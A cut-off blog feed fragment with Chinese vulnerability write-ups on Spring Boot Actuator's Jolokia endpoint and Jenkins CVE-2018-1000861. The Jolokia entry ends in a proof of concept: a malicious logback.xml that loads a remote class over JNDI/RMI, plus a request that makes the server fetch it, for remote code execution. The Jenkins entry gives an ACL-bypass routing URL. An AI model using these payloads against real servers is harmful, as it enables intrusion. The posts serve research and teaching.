      &lt;p&gt;本文接&lt;a href=&quot;https://www.lucifaer.com/2019/03/11/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%201/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;上文&lt;/a&gt;，这里不会分析原文章中所说的&lt;code&gt;/env&lt;/code&gt;这种利用的方法，而是说一下rr大佬的发现的另外一条利用链。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Java" scheme="https://lucifaer.com/tags/Java/"/>
    
      <category term="Spring" scheme="https://lucifaer.com/tags/Spring/"/>
    
      <category term="jolokia" scheme="https://lucifaer.com/tags/jolokia/"/>
    
  </entry>
  
  <entry>
    <title>Attack Spring Boot Actuator via jolokia Part 1</title>
    <link href="https://lucifaer.com/2019/03/11/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%201/"/>
    <id>https://lucifaer.com/2019/03/11/Attack Spring Boot Actuator via jolokia Part 1/</id>
    <published>2019-03-11T11:31:00.000Z</published>
    <updated>2019-03-11T11:35:15.000Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间看到twitter上有国外的研究人员<a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators" target="_blank" rel="noopener">Exploiting Spring Boot Actuators</a>这篇文章，打算跟着这篇文章学习一下。作者已经提供了一个<a href="https://github.com/artsploit/actuator-testbed" target="_blank" rel="noopener">简单的demo</a>用于大家调试。这篇是对<code>ch.qos.logback.classic.jmx.JMXConfigurator</code>这个利用点的分析，之后还会对rr找到的另外一个利用点进行分析。</p><a id="more"></a><h1 id="0x01-什么是Spring-Boot-Actuator"><a href="#0x01-什么是Spring-Boot-Actuator" class="headerlink" title="0x01 什么是Spring Boot Actuator"></a>0x01 什么是Spring Boot Actuator</h1><p>Actuators（翻译过来应该叫做执行器，但是个人感觉意思并不准确）是Spring Boot简化Spring开发过程中所提出的四个主要特性中的一个特性，它为Spring Boot应用添加了一定的管理特性，可以说类似于一个“监控器”一样的东西。Spring Boot Actuator给Spring Boot带来了很多有用的特性：</p><ul><li>管理端点</li><li>获取应用信息的”/info”端点</li><li>合理的异常处理以及默认的”/error”映射端点</li><li>当启用<code>Spring Security</code>时，会有一个审计事件框架。</li></ul><p>在这些特性中最有用的且最有意思的特性是管理端点，所有的管理节点都可以在<code>org.springframework.boot.actuate.endpoint</code>中找到。</p><p>在Spring Boot 1-1.4版本，这些端点都是可以直接访问的，不需要认证。在Spring Boot 1.5版本后除了<code>/health</code>和<code>/info</code>这两个端点，其他的端点都被默认的当做是敏感且安全的端点，但是开发人员经常会禁用此安全性，从而产生安全威胁。</p><h1 id="0x02-Jolokia端点的大致运行流程"><a href="#0x02-Jolokia端点的大致运行流程" class="headerlink" title="0x02 Jolokia端点的大致运行流程"></a>0x02 Jolokia端点的大致运行流程</h1><p>我们都知道Jolokia是一个用来访问远程<code>JMX MBeans</code>的方法，它允许对所有已经注册的MBean进行Http访问。接下来直接看一下<code>JolokiaMvcEndpoint</code>这个端点的具体实现。</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15519269122243.jpg" alt=""></p><p>可以看到直接可以通过<code>/jolokia</code>来访问到该端点，<code>handle</code>方法用来处理请求：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15519270460701.jpg" alt=""></p><p>可以跟一下路由处理流程，最后在<code>org.jolokia.http.HttpRequestHandler#handleGetRequest</code>这里处理get请求：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15519412693894.jpg" alt=""></p><p>可以看到红框中通过<code>JmxRequestFactory</code>工厂函数来创建了一个<code>JmxRequest</code>类，之后执行这个类。在创建这个类的时候回根据get请求的路由来指定具体执行什么样的功能，也就是说请求的参数通过创建不同的<code>JmxRequest</code>类来实现不同的方法，那么我们只需要看一下<code>JmxRequest</code>的继承关系，看看它有什么继承类就能大致的知道它具备什么样的功能：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15519415116175.jpg" alt=""></p><p>在继承类中我们发现存在<code>JmxWriteRequest</code>和<code>JmxExecRequest</code>这两个从名字来说让我们很兴奋的子类，我们知道<code>/jolokia/list</code>所执行的是<code>JmxListRequest</code>这个子类的功能，类比一下，<code>/jolakia/exec</code>就可以执行<code>JmxExecRequest</code>这个子类的功能。我们首先来具体看一下这个<code>JmxExecRequest</code>子类：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15519424535147.jpg" alt=""></p><p>在翻阅代码的过程中我注意到了这里，如果你自己跟了一下<code>JmxRequest</code>的创建过程的话，就知道首先是根据将请求的路由进行解析，将<code>/</code>之后的第一个字符串作为类别在<code>CREATOR_MAP</code>中查找是否存在该类别，如果存在则调用<code>newCreate</code>方法创建<code>JmxRequest</code>。下图为<code>CREATOR_MAP</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15519427835970.jpg" alt=""></p><p>知道了<code>JmxRequest</code>的创建过程后，我们来看看它怎么用，这个时候需要跟进一下<code>executeRequest</code>方法。</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15519450439844.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15519451136703.jpg" alt=""></p><p>遍历调度器，如果找到相应的调度器则调用调度器：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15519458178996.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15519461715427.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15519459643344.jpg" alt=""></p><p>这里转交调度器中相应的请求处理方法来处理：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15519463149136.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15519463989031.jpg" alt=""></p><p>可以看到这里存在<code>invoke</code>方法最终会执行我们指定的类中的指定的方法，而指定的类以及指定的方法都是可以通过路由参数来设置的。那么这里是否可以随便设置一个类呢？如果你跟了一遍这个流程的话，你会发现这里你所指定的类是从MBeanServer中来寻找的，当找不到你所设置的类的话，会抛出异常：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15519481493120.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15519481746551.jpg" alt=""></p><p>所以也就是说必须要从<code>/jolokia/list</code>所展示的MBean中去寻找可以调用的类及方法。</p><h1 id="0x03-构造请求路由"><a href="#0x03-构造请求路由" class="headerlink" title="0x03 构造请求路由"></a>0x03 构造请求路由</h1><p>可以看到所有我们可控点都是通过构造合理的请求完成的，那么如果想要完成攻击的话，就必须知道如何构造合理的请求。</p><p>回到<code>handleGetRequest</code>这个方法中，我们现在需要仔细来研究一下它是如何把路由变成格式化的参数的，主要关注这两个部分：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15519495192056.jpg" alt=""></p><p>这里面有很多正则解析的部分，我比较懒就下断点调了2333….</p><p>在动态调之前我们看一下<code>JmxExecRequest</code>的数据结构是什么样的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15519496914281.jpg" alt=""></p><p>注意看这段注释，这里会传入四个参数其中有两个参数是不能为空的：</p><ul><li>pObjectName：要执行操作的MBean的名称，不能为空</li><li>pOperation：要执行操作的名称（方法的名称），不能为空</li><li>pArguments：用于执行请求的参数，可以为空</li><li>pParams：用于处理请求的可选参数</li></ul><p>知道了数据结构，我们来看看具体的解析过程。</p><p>具体的解析过程在<code>JmxRequestFactory</code>这个工厂类中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15522871297117.jpg" alt=""></p><p>在<code>extractElementsFromPath</code>方法中完成了以<code>/</code>分割路由请求，并对路由进行处理的，其中最为重要的点在<code>split</code>方法中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15522872206146.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15522872422777.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15522872677405.jpg" alt=""></p><p>解析过程中最为重要的点在于两个正则表表达式：</p><ul><li><code>(.*?)(?:(?&lt;!!)((?:!.)*)/|$)</code></li><li><code>!(.)</code></li></ul><p>这里利用<code>Pattern.matcher</code>的正则表达式分组支持的特性，可以为正则表达式提供多次匹配的支持。这里的可以看到当处理的路由中存在<code>1!/2</code>这样的情况时，可以保留<code>/</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15522874419697.jpg" alt=""></p><p>然后以此类推将路由以<code>/</code>分组，将每个组中的参数保存到一个<code>ArrayList</code>中，之后对这个数组进行校验，这里将数组中的第一个元素当做是<code>type</code>，在<code>(R) getCreator(type)</code>根据此<code>type</code>在<code>CREATOR_MAP</code>中查找是否存在此方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15522876458488.jpg" alt=""></p><p>存在的话则调用相应的<code>newCreator</code>方法动态创建一个<code>JmxRequest</code>对象。这里是<code>JmxExecRequest</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15522900538326.jpg" alt=""></p><p>可以看到这里将pStack的栈顶移除并将其依次设置成<code>pObjectName</code>、<code>pOperation</code>。分析到这里我们只需要指定这样的路由就可以调用我们想要调用的类和方法了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jolokia/exec/class_name/function_name/params</span><br></pre></td></tr></table></figure><h1 id="0x04-寻找可以利用的点"><a href="#0x04-寻找可以利用的点" class="headerlink" title="0x04 寻找可以利用的点"></a>0x04 寻找可以利用的点</h1><p>根据上面两节的内容，我们现在可以控制<code>/exec</code>端点执行我们想让其执行的类中的方法，但是前提是这个类和方法必须在<code>/list</code>节点中存在。文章中说了一个<code>ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator</code>这个类，跟进看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15522908919940.jpg" alt=""></p><p>在<code>JMXConfigurator</code>这个类中发现存在一个<code>reloadByURL</code>方法，那是不是可以从远程加载一个新的配置文件从而造成RCE呢？感觉是有搞头的。那就着重看一下这个<code>reloadByURL</code>方法。</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15522918960892.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15522919279956.jpg" alt=""></p><p>获取输入流，并作为参数执行<code>doConfigure</code>方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15522919877544.jpg" alt=""></p><p>继续跟进:</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15522920270026.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15522920603923.jpg" alt=""></p><p>这里开始解析xml文件，看一下是否有防护：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15522920943832.jpg" alt=""></p><p>没有任何防护。也就是说这里是可以引入外部资源，同时解析xml文档的，那么这里起码就有一个ssrf，和一个没有回显的xxe。那么看一下这个所谓的JMX配置文件也就是<code>logback.xml</code>有没有什么可以搞的东西。在<code>logbacks.xml</code>中有这么一个标签：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15522930494363.jpg" alt=""></p><p>这里把<code>env-entry-name</code>改为自己的服务器地址就能在目标机上执行任意代码。</p><h1 id="0x05-poc构造"><a href="#0x05-poc构造" class="headerlink" title="0x05 poc构造"></a>0x05 poc构造</h1><p>漏洞分析的话上面的一个章节已经说得非常清楚了，下面我们来探讨以下如何利用这个漏洞，如果想要利用该漏洞的话需要准备以下几个必备条件：</p><ol><li>一个N/D服务（RMI或者LDAP皆可）</li><li>绑定在N/D服务上的恶意类</li><li>一个恶意的logback.xml</li><li>构造一个恶意请求</li></ol><p>N/D服务以及恶意类绑定就不过多叙述了，可以看16年bh的演讲，恶意的logback.xml可以构造如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">"rmi://127.0.0.1:2000/Exploit"</span> <span class="attr">as</span>=<span class="string">"appName"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"STDOUT"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.ConsoleAppender"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">withJansi</span>&gt;</span>true<span class="tag">&lt;/<span class="name">withJansi</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>[%thread] %highlight(%-5level) %cyan(%logger&#123;15&#125;) - %msg %n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">"info"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"STDOUT"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jmxConfigurator</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>请求的话可以构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1:9998!/logback.xml</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15522997474196.jpg" alt=""></p><h1 id="0x06-Reference"><a href="#0x06-Reference" class="headerlink" title="0x06 Reference"></a>0x06 Reference</h1><ul><li><a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators</a></li><li><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></li><li><a href="https://logback.qos.ch/manual/configuration.html#insertFromJNDI" target="_blank" rel="noopener">https://logback.qos.ch/manual/configuration.html#insertFromJNDI</a></li><li><a href="https://github.com/artsploit/actuator-testbed" target="_blank" rel="noopener">https://github.com/artsploit/actuator-testbed</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前段时间看到twitter上有国外的研究人员&lt;a href=&quot;https://www.veracode.com/blog/research/exploiting-spring-boot-actuators&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Exploiting Spring Boot Actuators&lt;/a&gt;这篇文章，打算跟着这篇文章学习一下。作者已经提供了一个&lt;a href=&quot;https://github.com/artsploit/actuator-testbed&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;简单的demo&lt;/a&gt;用于大家调试。这篇是对&lt;code&gt;ch.qos.logback.classic.jmx.JMXConfigurator&lt;/code&gt;这个利用点的分析，之后还会对rr找到的另外一个利用点进行分析。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Java" scheme="https://lucifaer.com/tags/Java/"/>
    
      <category term="Spring" scheme="https://lucifaer.com/tags/Spring/"/>
    
      <category term="jolokia" scheme="https://lucifaer.com/tags/jolokia/"/>
    
  </entry>
  
  <entry>
    <title>Jenkins RCE分析（CVE-2018-1000861分析）</title>
    <link href="https://lucifaer.com/2019/03/04/Jenkins%20RCE%E5%88%86%E6%9E%90%EF%BC%88CVE-2018-1000861%E5%88%86%E6%9E%90%EF%BC%89/"/>
    <id>https://lucifaer.com/2019/03/04/Jenkins RCE分析（CVE-2018-1000861分析）/</id>
    <published>2019-03-04T09:26:00.000Z</published>
    <updated>2019-03-04T09:33:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>这个漏洞是我个人感觉非常精彩的一个漏洞，非常值得好好的学习一下，Orange Tql！</p><a id="more"></a><h1 id="0x01-Jenkins的动态路由解析"><a href="#0x01-Jenkins的动态路由解析" class="headerlink" title="0x01 Jenkins的动态路由解析"></a>0x01 Jenkins的动态路由解析</h1><p><code>web.xml</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15508232678628.jpg" alt=""></p><p>可以看到Jenkins将所有的请求交给<code>org.kohsuke.stapler.Stapler</code>来处理的，跟进看一下这个类中的<code>service</code>方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15510912657193.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15508242301079.jpg" alt=""></p><p>可以看到这里会根据url来调用不同的webApp，如果url以<code>/$stapler/bound/</code>开头，则根节点对象为<code>org.kohsuke.stapler.bind.BoundObjectTable</code>，否则为<code>hudson.model.Hudson</code>（继承jenkins.model.Jenkins）。</p><p>这里涉及到四个参数：</p><ul><li>req：请求对象</li><li>rsp：响应对象</li><li>root：webApp（根节点）</li><li>servletPath：经过路由解析后的对象</li></ul><p>继续向下跟：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15508271723386.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15510915150703.jpg" alt=""></p><p>在<code>org.kohsuke.stapler.Stapler#tryInvoke</code>中会根据不同的webApp的类型对请求进行相应的处理，处理的优先级顺序向下：</p><ul><li>StaplerProxy</li><li>StaplerOverridable</li><li>StaplerFallback</li></ul><p>在<code>tryInvoke</code>中完成对路由的分派以及将路由与相应的功能进行绑定的操作，这里面比较复杂，但是非常有意思。</p><p>我们来看一下文档中是如何介绍路由请求这部分操作的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15510593937933.jpg" alt=""></p><p>文档中详细的说明了当我们传入类似<code>/foo/bar/</code>这样的url时路由解析的具体做法，具体看一下<code>tryInvoke</code>中的代码实现：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511484361514.jpg" alt=""></p><p>这里首先会根据webApp（根节点）来获取webApp的一个MetaClass对象，然后轮询MetaClass中所有的分派器——也就是Dispatcher.dispatcher。我们这里知道webApp是<code>hudson.model.Hudson</code>（继承jenkins.model.Jenkins），也就是说这里创建了MetaClass后会将请求包带入所有的分派器中进行相应的路由处理。</p><p>那么接下来就会有两个问题了：</p><ul><li>metaClass是如何构造的？还有metaClass是个什么东西？</li><li>在哪里完成的如文档所说的递归进行路由解析并通过分派器进行相应处理的呢？</li></ul><p>这个两个问题困扰我很长的时间，在我耐心的动态调了一遍之后才明白了他的调用原理。</p><h4 id="metaClass的构建"><a href="#metaClass的构建" class="headerlink" title="metaClass的构建"></a>metaClass的构建</h4><p>这里我会用动态调试的方式来解释metaClass的构建过程以及它是一个什么东西。</p><p>这里我用根据orange文章中所给出的路由来进行跟踪，路由为<code>/securityRealm/user/test/</code>。那么首先看一下metaClass的构建过程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511629693475.jpg" alt=""></p><p>这里有两个关键点<code>getMetaClass</code>以及<code>getKlass</code>，首先跟进<code>getKlass</code>看一下:</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511630759036.jpg" alt=""></p><p>首先先判别我们传进来的node（也就是节点）是否是属于上面三个Facet的一个配置项，关于Facet我的理解是用于简化项目配置项的一种操作，它并不属于J2EE的部分，这部分我是参考<a href="https://stackoverflow.com/questions/1809918/what-is-facet-in-javaee" target="_blank" rel="noopener">https://stackoverflow.com/questions/1809918/what-is-facet-in-javaee</a>。跟进<code>f.getKlass</code>，会发现直接返回null，所以我们不用关注这个循环，继续向下看<code>Klass.java(o.getClass())</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511638405454.jpg" alt=""></p><p>这里动态的实例化了<code>KlassNavigator.JAVA</code>，这里的Klass其实是一个动态实例化的对象，这个对象中存在很多方法用于操作，同时也实例化了<code>Klass</code>类。可能现在还是看不出来什么和metaClass有关的东西，那不妨接着看看<code>getMetaClass</code>中是怎么处理这个<code>Klass</code>的。</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511642536434.jpg" alt=""></p><p>跟进<code>MetaClass</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511656316649.jpg" alt=""></p><p>在这里首先通过之前实例化的<code>Klass</code>对象中的方法来获取node节点的信息，并调用<code>buildDispatchers()</code>来创建分派器，这个方法是url调度的核心。</p><p>这个方法非常的长，我们来梳理一下（其实orange已经帮助我们梳理了），我是按照代码中自上而下的顺序来整理的：</p><ul><li><code>&lt;obj&gt;.do&lt;token&gt;(...)</code>也就是<code>do(...)</code>和<code>@WebMethod</code>标注的方法</li><li><code>&lt;obj&gt;.doIndex(...)</code> </li><li><code>&lt;obj&gt;js&lt;token&gt;</code>也就是<code>js(...)</code></li><li>有<code>@JavaScriptMethod</code>标注的方法</li><li><code>NODE.getTOKEN()</code>也就是<code>get()</code></li><li><code>NODE.getTOKEN(StaplerRequest)</code>也就是<code>get(StaplerRequest)</code></li><li><code>&lt;obj&gt;.get&lt;Token&gt;(String)</code>也就是<code>get(String)</code></li><li><code>&lt;obj&gt;.get&lt;Token&gt;(int)</code>也就是<code>get(int)</code></li><li><code>&lt;obj&gt;.get&lt;Token&gt;(long)</code>也就是<code>get(long)</code></li><li><code>&lt;obj&gt;.getDynamic(&lt;token&gt;,...)</code>也就是<code>getDynamic()</code></li><li><code>&lt;obj&gt;.doDynamic(...)</code>也就是<code>doDynamic()</code></li></ul><p>也就是说符合以上命名规则的方法都可以被调用。</p><p><code>buildDispatchers()</code>的主要作用就是寻找对应的node节点与相应的处理方法（继承家族树中的所有类）并把这个方法加入到分配器dispatchers中。而这里所说的这个方法可能是对节点的进一步处理最后通过反射的方法调用真实处理该节点的方法。</p><p>举一个例子，在代码中可以看到在对<code>get(...)</code>类的node进行处理的时候都会动态生成一个<code>NameBasedDispatcher</code>对象并将其添加进入dispathers中，而这个对象都存在<code>doDispatch()</code>的方法用于处理分派器传来的请求，而在处理请求的最后都会调用<code>invoke</code>来反射调用真实处理方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511687918250.jpg" alt=""></p><p>这里先记一下这样的处理过程，在之后的分派器处理路由请求时会有涉及。</p><h4 id="路由请求处理过程"><a href="#路由请求处理过程" class="headerlink" title="路由请求处理过程"></a>路由请求处理过程</h4><p>仍然是以上面<code>/securityRealm/user/test/</code>路由为例。首先不看代码，先根据文档中所描述的处理方式大致猜一下这一串路由是如何解析的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-&gt; node: Hudson</span><br><span class="line">  -&gt; node: securityRealm</span><br><span class="line">    -&gt; node: user</span><br><span class="line">      -&gt; node: test</span><br></pre></td></tr></table></figure><p>回到<code>tryInvoke</code>中我们来具体看一下在代码中是怎么做的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511718645324.jpg" alt=""></p><p>注意到这里会有一个遍历<code>metaClass.dispatchers</code>的操作，然后在每次遍历的过程中，将请求、返回以及node节点传入<code>Dispatcher.dispatch</code>中，跟一下这个<code>dispatch</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511724916056.jpg" alt=""></p><p>这个是一个抽象类，那么他的具体实现是什么呢，还记得上一节所探讨的metaClass中对get请求的处理么，它们都会动态的生成一个<code>NameBasedDispatcher</code>对象，而我们现在的处理过程中就会调用到这个对象中的<code>dispatch</code>方法，我们来看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511729433360.jpg" alt=""></p><p>注意看红框的部分，这里会获取请求的node节点，并调用其具体实现中的<code>doDispatch</code>方法，而这个<code>doDispatch</code>方法是在<code>buildDispatchers()</code>中根据不同的node节点动态生成的，那么也就是调用了处理<code>get(...)</code>的<code>doDispatch</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511730690363.jpg" alt=""></p><p>这里我们有一个疑惑，第一个节点已经ok了，那么如何递归的解析其他的节点呢？这一点需要跟一下<code>req.getStapler().invoke()</code>，先看一下<code>getStapler()</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511758590085.jpg" alt=""></p><p>就是当前的Stapler。这里的ff是一个<code>org.kohsuke.stapler.Function</code>对象，它保存了当前根节点中方法的各种信息：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511772450427.jpg" alt=""></p><p>ff.invoke会返回<code>Hudson.security.HudsonPrivateSecurityRealm</code>对象：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511773288120.jpg" alt=""></p><p>然后将这个<code>HudsonPrivateSecurityRealm</code>对象作为新的根节点再次调用<code>tryInvoke</code>来进行解析，一直递归到将url全部解析完毕，这样才完成了动态路由解析。</p><h1 id="0x02-Jenkins白名单路由"><a href="#0x02-Jenkins白名单路由" class="headerlink" title="0x02 Jenkins白名单路由"></a>0x02 Jenkins白名单路由</h1><p>在跟踪Jenkins的动态路由解析中，一直没有提及一个过程，就是在<code>org.kohsuke.stapler.Stapler#tryInvoke</code>中首先对属于<code>StaplerProxy</code>的node进行的一个校验：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511778879492.jpg" alt=""></p><p>跟进看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15510781474963.jpg" alt=""></p><p>这里首先要进行权限检查，首先检查访问请求是否具有读的权限，如果没有读的权限则会抛出异常，在异常处理中会对URL进行二次检测，如果<code>isSubjectToMandatoryReadPermissionCheck</code>返回false，则仍能正常的返回，那么跟进看一下这个方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15510785640165.jpg" alt=""></p><p>这里有三种方法绕过权限检查，这里着重看一下第一种，可以看到这里有一个白名单，如果请求的路径是这其中的路径的话，就可以绕过权限检测：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15510836928487.jpg" alt=""></p><h1 id="0x03-绕过ACL进行跨物件操作"><a href="#0x03-绕过ACL进行跨物件操作" class="headerlink" title="0x03 绕过ACL进行跨物件操作"></a>0x03 绕过ACL进行跨物件操作</h1><p>这也是orange文章中最为精华的部分，主要是有三个关键点：</p><ul><li>Java中万物皆继承于java.lang.Object，所以所有在Java中的类都存在<code>getClass()</code>这个方法</li><li>Jenkins的动态路由解析过程也是一个<code>get(...)</code>的命名格式，所以<code>getClass()</code>可以在Jenkins调用链中被动态调用。</li><li>上文中所说的白名单可以绕过ACL的检测</li></ul><p>重点说一下第二点，根据文档以及我们上文的分析，如果有这么一个路由：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://jenkin.local/adjuncts/whatever/class/classLoader/resource/index.jsp/content</span><br></pre></td></tr></table></figure><p>那么在Jenkins的路由解析过程中会是这样的过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jenkins.model.Jenkins.getAdjuncts(&quot;whatever&quot;) </span><br><span class="line">.getClass()</span><br><span class="line">.getClassLoader()</span><br><span class="line">.getResource(&quot;index.jsp&quot;)</span><br><span class="line">.getContent()</span><br></pre></td></tr></table></figure><p>当例子中的class更改成其他的类时，get(…)也会被相应的调用，也就是说可以操作任意的GETTER方法！</p><p>理解了这一点，我们只需要把调用链中各个物件间的关系找出来就能构成一条完整的利用链！这一点才是整个漏洞中最精彩的一部分。</p><h1 id="0x04-整理漏洞利用链"><a href="#0x04-整理漏洞利用链" class="headerlink" title="0x04 整理漏洞利用链"></a>0x04 整理漏洞利用链</h1><p>在利用orange文章中给出的跳板url进行跟踪的过程中，我一直试图去理解为什么要这样的构造，而并不是直接拿来这个url进行动态调。下面我将尝试去解释如何一步步发现以及一步步的构造这个跳板。</p><p>在0x02中我们已经分析了可以利用三种白名单中的路由格式来绕过权限检查，这里我们利用<code>securityRealm</code>来构造利用链。</p><h4 id="securityRealm中可用的利用链"><a href="#securityRealm中可用的利用链" class="headerlink" title="securityRealm中可用的利用链"></a>securityRealm中可用的利用链</h4><p>我们看一下<code>securityRealm</code>对应的metaClass中有什么可以用的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15513255436337.jpg" 